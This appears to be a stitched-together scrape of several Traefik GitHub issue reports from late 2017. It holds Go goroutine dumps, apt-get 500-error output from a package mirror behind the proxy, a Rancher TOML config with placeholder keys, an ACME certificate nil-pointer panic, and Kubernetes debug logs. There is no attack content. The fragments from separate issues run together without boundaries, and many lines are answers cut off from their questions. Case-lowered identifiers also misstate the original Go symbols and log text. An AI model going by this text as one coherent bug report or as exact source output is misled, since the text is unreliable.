traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*server).servetls( , , , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2764 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...)
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:628 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/server.(*server).starthttpservers
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:271 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 71 [select]:
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/server.(*server).listenproviders( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:323 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/server.(*server).start.func1( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:188 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 72 [select, 1143 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/server.(*server).listenconfigurations( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:375 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/server.(*server).start.func2( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:191 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 77 [select]:
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1.1.1( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:171 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 75 [chan receive, 4089 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/server.(*server).listensignals( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server_signals.go:18 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/server.(*server).start
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:195 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 36 [io wait]:
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*fd).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:126 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*netfd).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/fd_unix.go:202 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*conn).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/net.go:176 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*persistconn).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1391 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*reader).fill( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/bufio.go:97 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*reader).peek( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/bufio.go:129 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*persistconn).readloop( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1539 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by net/http.(*transport).dialconn
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1186 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 37 [select]:
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*persistconn).writeloop( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1759 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by net/http.(*transport).dialconn
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1187 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 76 [io wait]:
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*tcplistener).accepttcp( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/tcpsock.go:234 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.tcpkeepalivelistener.accept( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:3120 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*server).listenandserve( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2636 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.listenandserve( , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2882 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/provider/web.(*provider).provide.func4()
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/provider/web/web.go:149 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 54420 [io wait, 2 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*fd).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:126 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*netfd).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/fd_unix.go:202 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*conn).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/net.go:176 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*persistconn).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1391 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*reader).fill( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/bufio.go:97 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*reader).peek( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/bufio.go:129 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*persistconn).readloop( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1539 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by net/http.(*transport).dialconn
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1186 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 54356 [runnable]:
traefik.1.p6y5l5dzf6gu@ns3000001 | sync.(*mutex).lock( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/sync/mutex.go:72 +
traefik.1.p6y5l5dzf6gu@ns3000001 | sync.(*pool).getslow( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/sync/pool.go:165 +
traefik.1.p6y5l5dzf6gu@ns3000001 | sync.(*pool).get( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/sync/pool.go:141 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.header.sortedkeyvalues( , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/header.go:130 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.header.writesubset( , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/header.go:152 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*chunkwriter).writeheader( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:1382 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*chunkwriter).write( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:351 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*writer).flush( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/bufio.go:567 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*response).finishrequest( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:1513 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*conn).serve( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:1806 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by net/http.(*server).serve
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2720 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 54421 [select, 2 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*persistconn).writeloop( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1759 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by net/http.(*transport).dialconn
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/transport.go:1187 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 54357 [io wait]:
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*fd).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:126 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*netfd).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/fd_unix.go:202 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*conn).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/net.go:176 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*connreader).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:753 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*reader).fill( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/bufio.go:97 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*reader).readslice( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/bufio.go:338 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*reader).readline( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/bufio.go:367 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/textproto.(*reader).readlineslice( , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/textproto/reader.go:55 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/textproto.(*reader).readline( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/textproto/reader.go:36 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.readrequest( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/request.go:925 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*conn).readrequest( , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:933 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*conn).serve( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:1739 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by net/http.(*server).serve
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2720 +
``` </details>
apt-get sporadically prints ```500 internal server error``` when crawling the package index
i tried running the mirror without traefik, and with traefik:v1.4.5 and both worked fine
for the requests that return 500s, the backend doesn't seem to have any logs of the request
shell output from ubuntu instance output: <details>
<summary>apt-get update</summary> ```shell
get:1 zesty inrelease [243 kb]
get:2 zesty-updates inrelease [89.2 kb]
get:3 zesty-backports inrelease [89.2 kb]
get:4 zesty-security inrelease [89.2 kb]
get:5 zesty/universe sources [10.7 mb]
ign:6 zesty/restricted amd64 packages
ign:7 zesty/multiverse amd64 packages
ign:8 zesty/universe amd64 packages ign:9 zesty/main amd64 packages ign:10 zesty-updates/universe sources ign:11 zesty-updates/main amd64 packages ign:12 zesty-updates/multiverse amd64 packages
ign:13 zesty-updates/universe amd64 packages
get:14 zesty-updates/restricted amd64 packages [3604 b]
ign:15 zesty-backports/universe amd64 packages ign:16 zesty-backports/main amd64 packages ign:6 zesty/restricted amd64 packages ign:7 zesty/multiverse amd64 packages ign:8 zesty/universe amd64 packages ign:9 zesty/main amd64 packages
get:10 zesty-updates/universe sources [85.0 kb]
ign:11 zesty-updates/main amd64 packages ign:12 zesty-updates/multiverse amd64 packages
ign:13 zesty-updates/universe amd64 packages
ign:15 zesty-backports/universe amd64 packages
ign:16 zesty-backports/main amd64 packages
ign:6 zesty/restricted amd64 packages ign:7 zesty/multiverse amd64 packages get:8 zesty/universe amd64 packages [8068 kb]
ign:9 zesty/main amd64 packages
ign:11 zesty-updates/main amd64 packages
ign:12 zesty-updates/multiverse amd64 packages
ign:13 zesty-updates/universe amd64 packages
ign:15 zesty-backports/universe amd64 packages
ign:16 zesty-backports/main amd64 packages
err:6 zesty/restricted amd64 packages 500 internal server error
ign:7 zesty/multiverse amd64 packages
ign:17 zesty-security/universe sources
ign:18 zesty-security/universe amd64 packages
ign:19 zesty-security/main amd64 packages
ign:20 zesty-security/multiverse amd64 packages
ign:21 zesty-security/restricted amd64 packages
ign:9 zesty/main amd64 packages
err:11 zesty-updates/main amd64 packages 500 internal server error
ign:12 zesty-updates/multiverse amd64 packages
ign:13 zesty-updates/universe amd64 packages
err:15 zesty-backports/universe amd64 packages 500 internal server error
ign:16 zesty-backports/main amd64 packages
get:17 zesty-security/universe sources [35.4 kb]
ign:18 zesty-security/universe amd64 packages
ign:19 zesty-security/main amd64 packages
ign:20 zesty-security/multiverse amd64 packages
get:21 zesty-security/restricted amd64 packages [3221 b]
ign:18 zesty-security/universe amd64 packages
ign:19 zesty-security/main amd64 packages
ign:20 zesty-security/multiverse amd64 packages
err:18 zesty-security/universe amd64 packages 500 internal server error
ign:19 zesty-security/main amd64 packages
ign:20 zesty-security/multiverse amd64 packages
fetched 19.4 mb in 0s (27.1 mb/s)
reading package lists..
e: failed to fetch 500 internal server error
e: failed to fetch 500 internal server error
e: failed to fetch 500 internal server error
e: failed to fetch 500 internal server error
e: some index files failed to download
they have been ignored, or old ones used instead.
``` </details> ### output of `traefik version`: ```
version: v1.5.0-rc2
codename: cancoillotte
go version: go1.9.2
built: 2017-12-06_03:07:42pm
os/arch: linux/amd64
only the ones created using compose and the cli.
a reverse proxy incapable of presenting https certificates, only serving http traffic.
a route to `{containername}.{domain}`.
infinite waiting.
a bad gateway error due to traefik using the old port
a single curl on nginx1 generates 2 lines in the access log: ```
172.17.0.1 - - [13/dec/2017:19:49:27 +0000] "get / http/1.1" - - - "curl/7.54.0" 33 "host-nginx1-test-tld-3" - 0ms
172.17.0.1 - - [13/dec/2017:19:49:27 +0000] "get / http/1.1" 200 612 - "curl/7.54.0" 34 "host-nginx1-test-tld-3" " " 0ms
``` now a curl on nginx2 shows a erroneous output in the first line: ```
172.17.0.1 - - [13/dec/2017:19:50:41 +0000] "get / http/1.1" - - - "curl/7.54.0" 41 "host-nginx1-test-tld-3" - 0ms
172.17.0.1 - - [13/dec/2017:19:50:41 +0000] "get / http/1.1" 200 612 - "curl/7.54.0" 42 "host-nginx2-test-tld-2" " " 0ms
segfault when trying to load the acme certificate when resolving the challenge: ```shell
traefik_traefik.1.w4x67i9e5ig5@host.example.org | time="2017-12-10t22:45:31z" level=debug msg="look for provided certificate to validate [traefik.example.work]..."
traefik_traefik.1.w4x67i9e5ig5@host.example.org | legolog: 2017/12/10 22:45:31 [info][traefik.example.work] acme: obtaining bundled san certificate
traefik_traefik.1.w4x67i9e5ig5@host.example.org | time="2017-12-10t22:45:31z" level=debug msg="no provided certificate found for domains [traefik.example.work], get acme certificate."
traefik_traefik.1.w4x67i9e5ig5@host.example.org | time="2017-12-10t22:45:31z" level=debug msg="challenge getcertificate traefik.example.work"
traefik_traefik.1.w4x67i9e5ig5@host.example.org | time="2017-12-10t22:45:31z" level=debug msg="loading acme certificates [traefik.example.work]..."
traefik_traefik.1.w4x67i9e5ig5@host.example.org | panic: runtime error: invalid memory address or nil pointer dereference
traefik_traefik.1.w4x67i9e5ig5@host.example.org | [signal sigsegv: segmentation violation code= addr= pc= ]
traefik_traefik.1.w4x67i9e5ig5@host.example.org |
traefik_traefik.1.w4x67i9e5ig5@host.example.org | goroutine 154 [running]:
traefik_traefik.1.w4x67i9e5ig5@host.example.org | github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getchallenges.func1( , , , , )
traefik_traefik.1.w4x67i9e5ig5@host.example.org | /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:550 +
traefik_traefik.1.w4x67i9e5ig5@host.example.org | created by github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getchallenges
traefik_traefik.1.w4x67i9e5ig5@host.example.org | /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:547 +
``` ### traefik version reproduced with 3 different official traefik images: - `traefik:v1.4.3-alpine`
- `traefik:v1.4.5-alpine`
- `traefik:v1.5.0-rc2-alpine` output for the `traefik:v1.5.0-rc2-alpine`: ```
version: v1.5.0-rc2
codename: cancoillotte
go version: go1.9.2
built: 2017-12-06_03:07:42pm
os/arch: linux/amd64
had to restart the traefik service in order to make it pick up changes
### output of `traefik version`: ```
(tried multiple in the 1.4.x range aswell.
error running traefik: zk: unknown error
described above
an empty string in the place of an ip address.
log messages telling me that traefik.port was not set on the services
### output of `traefik version`: ```
version: v1.5.0-rc2
codename: cancoillotte
go version: go1.9.2
built: 2017-12-06_03:07:42pm
os/arch: linux/amd64
``` ### what is your environment & configuration: ```toml
loglegel = "debug"
defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" [web]
address = ":8080" [rancher]
domain = "subdomain.example.co.uk" [rancher.api] endpoint = " " accesskey = "examplekey" secretkey = "examplesecretkey"
port 80 is exposed on the `web` services within the rancher stacks that are running ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
debu[2017-12-07t17:29:48z] filtering service web/stack-name-1 without traefik.port label ```
the above is repeated for each service within each stack.
stack in logs: ```shell
time="2017-12-07t16:41:37z" level=debug msg="configuration received from provider docker: {"backends":{"backend-api":{"servers":{"server-server_batch_1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}},"backend-web":{"servers":{"server-server_web_1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-pathprefix-0":{"entrypoints":["http","https"],"backend":"backend-web","routes":{"route-frontend-pathprefix-0":{"rule":"pathprefix:/"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{},"redirect":"https"},"frontend-pathprefixstrip-batch-1":{"entrypoints":["http","https"],"backend":"backend-api","routes":{"route-frontend-pathprefixstrip-batch-1":{"rule":"pathprefixstrip:/batch"}},"passhostheader":true,"priority":0,"basicauth":[],"headers":{},"redirect":"https"}}}" time="2017-12-07t16:41:37z" level=debug msg="creating frontend frontend-pathprefix-0" time="2017-12-07t16:41:37z" level=debug msg="wiring frontend frontend-pathprefix-0 to entrypoint http" time="2017-12-07t16:41:37z" level=debug msg="creating route route-frontend-pathprefix-0 pathprefix:/" time="2017-12-07t16:41:37z" level=debug msg="creating backend backend-web" time="2017-12-07t16:41:37z" level=debug msg="creating load-balancer wrr" time="2017-12-07t16:41:37z" level=debug msg="creating server server-server_web_1 at with weight 0" time="2017-12-07t16:41:37z" level=error msg="error in go routine: runtime error: invalid memory address or nil pointer dereference" goroutine 13 [running]:
runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 +
runtime/debug.printstack() /usr/local/go/src/runtime/debug/stack.go:16 +
github.com/containous/traefik/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/safe/routine.go:148 +
github.com/containous/traefik/safe.gowithrecover.func1.1( ) /go/src/github.com/containous/traefik/safe/routine.go:139 +
panic( , ) /usr/local/go/src/runtime/panic.go:491 +
github.com/containous/traefik/server.(*server).buildredirect( , , , , , , , , , ) /go/src/github.com/containous/traefik/server/server.go:1314 +
github.com/containous/traefik/server.(*server).loadconfig( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/server/server.go:1136 +
github.com/containous/traefik/server.(*server).loadconfiguration( , , , ) /go/src/github.com/containous/traefik/server/server.go:434 +
github.com/containous/traefik/server.(*server).listenconfigurations( , ) /go/src/github.com/containous/traefik/server/server.go:418 +
github.com/containous/traefik/server.(*server).start.func2( ) /go/src/github.com/containous/traefik/server/server.go:198 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 +
i see backends without any settings.
web provider configuration is deprecated, you should use these options : api, rest provider, ping and metrics
ok:
headers are split on `,` this create a problem.
the following logs are logged every seconds (every kubernetes endpoint event in fact) ``` 2017-11-30t10:32:39.417163072z time="2017-11-30t10:32:39z" level=debug msg="received kubernetes event kind *v1.endpoints" 2017-11-30t10:32:39.417225305z time="2017-11-30t10:32:39z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." 2017-11-30t10:32:39.417250086z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." 2017-11-30t10:32:39.417262604z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/custom-request-headers annotation, skipping..." 2017-11-30t10:32:39.417271808z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/custom-response-headers annotation, skipping..." 2017-11-30t10:32:39.417280676z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." 2017-11-30t10:32:39.417302616z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." 2017-11-30t10:32:39.417385279z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/ssl-proxy-headers annotation, skipping..." 2017-11-30t10:32:39.417438467z time="2017-11-30t10:32:39z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." 2017-11-30t10:32:39.417497101z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." 2017-11-30t10:32:39.417592884z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/custom-request-headers annotation, skipping..." 2017-11-30t10:32:39.417612415z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/custom-response-headers annotation, skipping..." 2017-11-30t10:32:39.417636123z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." 